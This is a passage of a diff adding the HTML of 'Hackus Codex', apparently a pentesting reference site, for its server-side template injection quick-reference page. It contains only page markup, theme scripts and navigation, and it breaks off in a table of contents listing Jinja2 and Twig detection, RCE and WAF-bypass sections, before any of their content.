@@ -1,0 +1,3299 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A clean, practical knowledge base for bug bounty hunters and pentesters">
+      
+      
+      
+        <link rel="canonical" href="https://hackus-codex.online/quick/ssti/">
+      
+      
+        <link rel="prev" href="../ssrf/">
+      
+      
+        <link rel="next" href="../lfi/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>SSTI - Hackus Codex</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+  
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+  
+  <style>:root{--md-admonition-icon--note:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M14%2010h5.5L14%204.5zM5%203h10l6%206v10a2%202%200%200%201-2%202H5a2%202%200%200%201-2-2V5c0-1.11.89-2%202-2m0%209v2h14v-2zm0%204v2h9v-2z%22/%3E%3C/svg%3E');--md-admonition-icon--tip:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M12%206a6%206%200%200%201%206%206c0%202.22-1.21%204.16-3%205.2V19a1%201%200%200%201-1%201h-4a1%201%200%200%201-1-1v-1.8c-1.79-1.04-3-2.98-3-5.2a6%206%200%200%201%206-6m2%2015v1a1%201%200%200%201-1%201h-2a1%201%200%200%201-1-1v-1zm6-10h3v2h-3zM1%2011h3v2H1zM13%201v3h-2V1zM4.92%203.5l2.13%202.14-1.42%201.41L3.5%204.93zm12.03%202.13%202.12-2.13%201.43%201.43-2.13%202.12z%22/%3E%3C/svg%3E');--md-admonition-icon--warning:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M13%2014h-2V9h2m0%209h-2v-2h2M1%2021h22L12%202z%22/%3E%3C/svg%3E');--md-admonition-icon--danger:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M17.66%2011.2c-.23-.3-.51-.56-.77-.82-.67-.6-1.43-1.03-2.07-1.66C13.33%207.26%2013%204.85%2013.95%203c-.95.23-1.78.75-2.49%201.32-2.59%202.08-3.61%205.75-2.39%208.9.04.1.08.2.08.33%200%20.22-.15.42-.35.5-.23.1-.47.04-.66-.12a.6.6%200%200%201-.14-.17c-1.13-1.43-1.31-3.48-.55-5.12C5.78%2010%204.87%2012.3%205%2014.47c.06.5.12%201%20.29%201.5.14.6.41%201.2.71%201.73%201.08%201.73%202.95%202.97%204.96%203.22%202.14.27%204.43-.12%206.07-1.6%201.83-1.66%202.47-4.32%201.53-6.6l-.13-.26c-.21-.46-.77-1.26-.77-1.26m-3.16%206.3c-.28.24-.74.5-1.1.6-1.12.4-2.24-.16-2.9-.82%201.19-.28%201.9-1.16%202.11-2.05.17-.8-.15-1.46-.28-2.23-.12-.74-.1-1.37.17-2.06.19.38.39.76.63%201.06.77%201%201.98%201.44%202.24%202.8.04.14.06.28.06.43.03.82-.33%201.72-.93%202.27%22/%3E%3C/svg%3E');--md-admonition-icon--bug:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M14%2012h-4v-2h4m0%206h-4v-2h4m6-6h-2.81a6%206%200%200%200-1.82-1.96L17%204.41%2015.59%203l-2.17%202.17a6%206%200%200%200-2.83%200L8.41%203%207%204.41l1.62%201.63C7.88%206.55%207.26%207.22%206.81%208H4v2h2.09c-.05.33-.09.66-.09%201v1H4v2h2v1c0%20.34.04.67.09%201H4v2h2.81c1.04%201.79%202.97%203%205.19%203s4.15-1.21%205.19-3H20v-2h-2.09c.05-.33.09-.66.09-1v-1h2v-2h-2v-1c0-.34-.04-.67-.09-1H20z%22/%3E%3C/svg%3E');--md-admonition-icon--example:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22m14.6%2016.6%204.6-4.6-4.6-4.6L16%206l6%206-6%206zm-5.2%200L4.8%2012l4.6-4.6L8%206l-6%206%206%206z%22/%3E%3C/svg%3E');--md-admonition-icon--quote:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M14%2017h3l2-4V7h-6v6h3M6%2017h3l2-4V7H5v6h3z%22/%3E%3C/svg%3E');}</style>
+
+
+
+  
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+  
+  <style>:root{.md-tag.md-tag--critical{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M17.66%2011.2c-.23-.3-.51-.56-.77-.82-.67-.6-1.43-1.03-2.07-1.66C13.33%207.26%2013%204.85%2013.95%203c-.95.23-1.78.75-2.49%201.32-2.59%202.08-3.61%205.75-2.39%208.9.04.1.08.2.08.33%200%20.22-.15.42-.35.5-.23.1-.47.04-.66-.12a.6.6%200%200%201-.14-.17c-1.13-1.43-1.31-3.48-.55-5.12C5.78%2010%204.87%2012.3%205%2014.47c.06.5.12%201%20.29%201.5.14.6.41%201.2.71%201.73%201.08%201.73%202.95%202.97%204.96%203.22%202.14.27%204.43-.12%206.07-1.6%201.83-1.66%202.47-4.32%201.53-6.6l-.13-.26c-.21-.46-.77-1.26-.77-1.26m-3.16%206.3c-.28.24-.74.5-1.1.6-1.12.4-2.24-.16-2.9-.82%201.19-.28%201.9-1.16%202.11-2.05.17-.8-.15-1.46-.28-2.23-.12-.74-.1-1.37.17-2.06.19.38.39.76.63%201.06.77%201%201.98%201.44%202.24%202.8.04.14.06.28.06.43.03.82-.33%201.72-.93%202.27%22/%3E%3C/svg%3E');}.md-tag.md-tag--high{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M13%2014h-2V9h2m0%209h-2v-2h2M1%2021h22L12%202z%22/%3E%3C/svg%3E');}.md-tag.md-tag--medium{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M13%2013h-2V7h2m0%2010h-2v-2h2M12%202A10%2010%200%200%200%202%2012a10%2010%200%200%200%2010%2010%2010%2010%200%200%200%2010-10A10%2010%200%200%200%2012%202%22/%3E%3C/svg%3E');}.md-tag.md-tag--low{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M13%209h-2V7h2m0%2010h-2v-6h2m-1-9A10%2010%200%200%200%202%2012a10%2010%200%200%200%2010%2010%2010%2010%200%200%200%2010-10A10%2010%200%200%200%2012%202%22/%3E%3C/svg%3E');}.md-tag.md-tag--server-side{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M4%201h16a1%201%200%200%201%201%201v4a1%201%200%200%201-1%201H4a1%201%200%200%201-1-1V2a1%201%200%200%201%201-1m0%208h16a1%201%200%200%201%201%201v4a1%201%200%200%201-1%201H4a1%201%200%200%201-1-1v-4a1%201%200%200%201%201-1m0%208h16a1%201%200%200%201%201%201v4a1%201%200%200%201-1%201H4a1%201%200%200%201-1-1v-4a1%201%200%200%201%201-1M9%205h1V3H9zm0%208h1v-2H9zm0%208h1v-2H9zM5%203v2h2V3zm0%208v2h2v-2zm0%208v2h2v-2z%22/%3E%3C/svg%3E');}.md-tag.md-tag--client-side{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M21%2016H3V4h18m0-2H3c-1.11%200-2%20.89-2%202v12a2%202%200%200%200%202%202h7v2H8v2h8v-2h-2v-2h7a2%202%200%200%200%202-2V4a2%202%200%200%200-2-2%22/%3E%3C/svg%3E');}.md-tag.md-tag--logic{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M21.33%2012.91c.09%201.55-.62%203.04-1.89%203.95l.77%201.49c.23.45.26.98.06%201.45-.19.47-.58.84-1.06%201l-.79.25a1.687%201.687%200%200%201-1.86-.55L14.44%2018c-.89-.15-1.73-.53-2.44-1.1-.5.15-1%20.23-1.5.23-.88%200-1.76-.27-2.5-.79-.53.16-1.07.23-1.62.22-.79.01-1.57-.15-2.3-.45a4.1%204.1%200%200%201-2.43-3.61c-.08-.72.04-1.45.35-2.11-.29-.75-.32-1.57-.07-2.33C2.3%207.11%203%206.32%203.87%205.82c.58-1.69%202.21-2.82%204-2.7%201.6-1.5%204.05-1.66%205.83-.37.42-.11.86-.17%201.3-.17%201.36-.03%202.65.57%203.5%201.64%202.04.53%203.5%202.35%203.58%204.47.05%201.11-.25%202.2-.86%203.13.07.36.11.72.11%201.09m-5-1.41c.57.07%201.02.5%201.02%201.07a1%201%200%200%201-1%201h-.63c-.32.9-.88%201.69-1.62%202.29.25.09.51.14.77.21%205.13-.07%204.53-3.2%204.53-3.25a2.59%202.59%200%200%200-2.69-2.49%201%201%200%200%201-1-1%201%201%200%200%201%201-1c1.23.03%202.41.49%203.33%201.3.05-.29.08-.59.08-.89-.06-1.24-.62-2.32-2.87-2.53-1.25-2.96-4.4-1.32-4.4-.4-.03.23.21.72.25.75a1%201%200%200%201%201%201c0%20.55-.45%201-1%201-.53-.02-1.03-.22-1.43-.56-.48.31-1.03.5-1.6.56-.57.05-1.04-.35-1.07-.9a.97.97%200%200%201%20.88-1.1c.16-.02.94-.14.94-.77%200-.66.25-1.29.68-1.79-.92-.25-1.91.08-2.91%201.29C6.75%205%206%205.25%205.45%207.2%204.5%207.67%204%208%203.78%209c1.08-.22%202.19-.13%203.22.25.5.19.78.75.59%201.29-.19.52-.77.78-1.29.59-.73-.32-1.55-.34-2.3-.06-.32.27-.32.83-.32%201.27%200%20.74.37%201.43%201%201.83.53.27%201.12.41%201.71.4q-.225-.39-.39-.81a1.038%201.038%200%200%201%201.96-.68c.4%201.14%201.42%201.92%202.62%202.05%201.37-.07%202.59-.88%203.19-2.13.23-1.38%201.34-1.5%202.56-1.5m2%207.47-.62-1.3-.71.16%201%201.25zm-4.65-8.61a1%201%200%200%200-.91-1.03c-.71-.04-1.4.2-1.93.67-.57.58-.87%201.38-.84%202.19a1%201%200%200%200%201%201c.57%200%201-.45%201-1%200-.27.07-.54.23-.76.12-.1.27-.15.43-.15.55.03%201.02-.38%201.02-.92%22/%3E%3C/svg%3E');}.md-tag.md-tag--infra{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M6.5%2020q-2.28%200-3.89-1.57Q1%2016.85%201%2014.58q0-1.95%201.17-3.48%201.18-1.53%203.08-1.95.63-2.3%202.5-3.72Q9.63%204%2012%204q2.93%200%204.96%202.04Q19%208.07%2019%2011q1.73.2%202.86%201.5%201.14%201.28%201.14%203%200%201.88-1.31%203.19T18.5%2020Z%22/%3E%3C/svg%3E');}}</style>
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/terminal.css">
+    
+      <link rel="stylesheet" href="../../stylesheets/cards.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="lime">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#ssti-payloads" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Hackus Codex" class="md-header__button md-logo" aria-label="Hackus Codex" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m15.8 18.5 6 1.6-.4 1.9-9.4-2.5L2.6 22l-.5-1.9 6-1.6L2 16.9l.5-1.9 9.4 2.5 9.4-2.5.5 1.9zM18 8c0 1.8-.8 3.3-2 4.4V15h-2v-2h-1v2h-2v-2h-1v2H8v-2.6C6.8 11.3 6 9.8 6 8a6 6 0 0 1 6-6 6 6 0 0 1 6 6m-7-.5c0-.8-.7-1.5-1.5-1.5S8 6.7 8 7.5 8.7 9 9.5 9 11 8.3 11 7.5m2 3.5-1-2-1 2zm3-3.5c0-.8-.7-1.5-1.5-1.5S13 6.7 13 7.5 13.7 9 14.5 9 16 8.3 16 7.5"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hackus Codex
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SSTI
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="lime"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="green"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  🎯 Quick Ref
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../vulns/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  🔥 Vulnerabilities
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../chains/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  ⛓️ Chains
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../frameworks/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  🛠️ Frameworks
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../tags/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  🏷️ Tags
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Hackus Codex" class="md-nav__button md-logo" aria-label="Hackus Codex" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m15.8 18.5 6 1.6-.4 1.9-9.4-2.5L2.6 22l-.5-1.9 6-1.6L2 16.9l.5-1.9 9.4 2.5 9.4-2.5.5 1.9zM18 8c0 1.8-.8 3.3-2 4.4V15h-2v-2h-1v2h-2v-2h-1v2H8v-2.6C6.8 11.3 6 9.8 6 8a6 6 0 0 1 6-6 6 6 0 0 1 6 6m-7-.5c0-.8-.7-1.5-1.5-1.5S8 6.7 8 7.5 8.7 9 9.5 9 11 8.3 11 7.5m2 3.5-1-2-1 2zm3-3.5c0-.8-.7-1.5-1.5-1.5S13 6.7 13 7.5 13.7 9 14.5 9 16 8.3 16 7.5"/></svg>
+
+    </a>
+    Hackus Codex
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎯 Quick Ref
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🎯 Quick Ref
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xss/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqli/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQLi
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#detection-polyglot" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection (Polyglot)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection (Polyglot)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection Flow
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jinja2-python" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Jinja2 (Python)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Jinja2 (Python)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#waf-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WAF Bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#twig-php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Twig (PHP)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Twig (PHP)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RCE
